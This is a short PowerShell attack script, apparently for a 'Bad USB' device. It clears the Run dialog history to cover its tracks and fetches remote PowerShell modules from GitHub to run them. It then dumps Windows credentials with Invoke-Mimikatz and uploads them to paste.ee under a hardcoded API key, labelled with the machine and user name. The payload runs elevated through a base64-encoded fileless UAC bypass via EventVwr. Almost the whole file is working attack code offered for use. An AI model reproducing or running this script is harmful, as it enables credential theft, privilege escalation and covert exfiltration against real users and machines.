function runHack {
param (
	################################################
	##          API Key from paste.ee             ##
	  $api_key = '2856557c5d9f96d0e416c70aa691cbd1'
	################################################
	)
	
	Invoke-Expression (New-Object Net.WebClient).DownloadString('C:\Dev\MrRobot\Hack 01 - Mimikatz Bad USB\Clean-RunMRU.psm1')
	Clean-RunMRU -Last
	
	$Payload = "
	Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/H3LL0WORLD/Powershell/master/Paste.ee.ps1')
	Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')
	`$Creds = Invoke-Mimikatz -DumpCreds
	`$Description = 'Mimikatz Dump - ' + `$env:COMPUTERNAME + '\' + `$env:USERNAME
	New-Paste -api_key $api_key -description `$Description -paste `$Creds
	"

	## Fileless bypass uac
	# Import module
	Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/master/Invoke-EventVwrBypass.ps1')
	# Execute bypass w/encoded payload
	Invoke-EventVwrBypass -Command ('Powershell -EncodedCommand ' + $([Convert]::ToBase64String($([System.Text.Encoding]::Unicode.GetBytes($Payload))))) -Force
}